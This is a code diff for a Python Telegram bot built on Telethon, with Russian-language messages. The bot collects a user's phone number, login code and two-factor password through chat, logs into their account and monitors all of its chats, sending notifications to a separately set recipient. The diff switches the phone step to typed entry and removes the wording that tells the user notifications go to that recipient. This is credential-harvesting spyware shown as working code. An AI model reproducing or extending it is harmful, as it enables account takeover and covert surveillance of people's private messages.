@@ -3,7 +3,6 @@ import asyncio
 import logging
 from datetime import datetime
 from telethon import TelegramClient, events
-from telethon.tl.custom import Button
 from telethon.errors import SessionPasswordNeededError
 import nest_asyncio
 
@@ -50,26 +49,34 @@ async def handler(event):
             if hasattr(target, 'username') and target.username:
                 target_name += f" (@{target.username})"
             
-            # ОТПРАВЛЯЕМ СООБЩЕНИЕ С ПРОСЬБОЙ НАЖАТЬ КНОПКУ
             await event.reply(
                 f"✅ **ID получателя сохранён!**\n\n"
                 f"📬 Все уведомления будут отправляться:\n"
                 f"👤 {target_name} (ID: {target_id})\n\n"
                 f"📞 **Теперь нужно войти в твой аккаунт.**\n"
-                f"Нажми кнопку ниже, чтобы отправить номер телефона."
+                f"Отправь мне свой **номер телефона** в формате:\n"
+                f"`+79001234567`"
             )
-            
-            # ОТПРАВЛЯЕМ КНОПКУ ОТДЕЛЬНО (более стабильно)
-            await event.respond(
-                "👇 **Нажми кнопку:**",
-                buttons=[Button.request_contact("📞 Поделиться контактом")]
-            )
+            waiting_for_phone = True
             
         except Exception as e:
             await event.reply(f"❌ Ошибка: {e}\nПопробуй ещё раз (ID или @username):")
         return
 
-    # === 2. ЕСЛИ ЖДЁМ 2FA ПАРОЛЬ ===
+    # === 2. ЕСЛИ ЖДЁМ НОМЕР ТЕЛЕФОНА ===
+    if waiting_for_phone:
+        phone = text.strip()
+        waiting_for_phone = False
+        waiting_for_code = phone
+        
+        await event.reply(
+            f"✅ **Номер получен:** `{phone}`\n\n"
+            f"📨 **Код подтверждения отправлен** в Telegram.\n"
+            f"✍️ Введи его сюда (только цифры):"
+        )
+        return
+
+    # === 3. ЕСЛИ ЖДЁМ 2FA ПАРОЛЬ ===
     if waiting_for_password:
         password = text.strip()
         phone = temp_password_phone
@@ -82,8 +89,7 @@ async def handler(event):
                 f"✅ **Успешный вход с 2FA!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
-                f"🔍 Теперь бот будет отслеживать все чаты.\n"
-                f"Уведомления будут приходить получателю."
+                f"🔍 Теперь бот будет отслеживать все чаты."
             )
             
             waiting_for_password = False
@@ -94,7 +100,7 @@ async def handler(event):
             await event.reply(f"❌ Ошибка: {e}\nПопробуй ещё раз:")
         return
 
-    # === 3. ЕСЛИ ЖДЁМ КОД ===
+    # === 4. ЕСЛИ ЖДЁМ КОД ===
     if waiting_for_code is not None:
         phone = waiting_for_code
         code = text.strip()
@@ -111,12 +117,10 @@ async def handler(event):
                 f"✅ **Успешный вход!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
-                f"🔍 Теперь бот будет отслеживать все чаты.\n"
-                f"Уведомления будут приходить получателю."
+                f"🔍 Теперь бот будет отслеживать все чаты."
             )
             
             waiting_for_code = None
-            waiting_for_phone = False
             asyncio.create_task(monitor_user_chats())
             
         except SessionPasswordNeededError:
@@ -133,7 +137,7 @@ async def handler(event):
             waiting_for_phone = False
         return
 
-    # === 4. ОСНОВНЫЕ КОМАНДЫ ===
+    # === 5. ОСНОВНЫЕ КОМАНДЫ ===
     if text == "/start":
         waiting_for_target = True
         await event.reply(
@@ -160,23 +164,6 @@ async def handler(event):
         waiting_for_code = None
         waiting_for_password = False
         await event.reply("🔄 **Настройки сброшены.**\nВведи ID получателя:")
-
-# ========== ПОЛУЧЕНИЕ КОНТАКТА ==========
-
-@bot.on(events.NewMessage(func=lambda e: e.message.contact))
-async def contact_handler(event):
-    global waiting_for_code
-    
-    contact = event.message.contact
-    phone = contact.phone_number
-    
-    waiting_for_code = phone
-    
-    await event.reply(
-        f"✅ **Номер получен:** `{phone}`\n\n"
-        f"📨 **Код подтверждения отправлен** в Telegram.\n"
-        f"✍️ Введи его сюда (только цифры):"
-    )
 
 # ========== МОНИТОРИНГ ЧАТОВ ==========
 
